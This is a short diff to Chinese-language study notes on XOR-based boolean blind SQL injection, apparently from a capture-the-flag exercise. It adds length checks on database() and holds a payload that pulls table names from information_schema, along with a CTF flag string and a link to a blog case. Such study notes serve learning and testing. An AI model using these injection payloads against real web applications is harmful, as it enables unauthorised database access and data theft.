@@ -19,6 +19,11 @@ substr("abc",1,1)获取第一位置的1个字符
 ord()字符转ascii的数值
 ascii()字符转ascii的数值
 
+先判断是否布尔差异
+1^length(database())>4^1
+1^length(database())<4^1
+
+
 布尔，再异或的差异，获取表名
 1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)^1
 [*] F1naI1y,Flaaaaag~
@@ -31,6 +36,8 @@ ascii()字符转ascii的数值
 select ascii() %s %d   
 python中%s运算符%d每次的中间值，比较的结果select
 ```
+
+
 
 案例：
 <https://www.cnblogs.com/upfine/p/16367693.html#:~:text=%E5%88%86%E4%BA%AB%E4%B8%8B%E8%87%AA%E5%B7%B1%E5%9C%A8%E5%AE%8C%E6%88%90%20[>
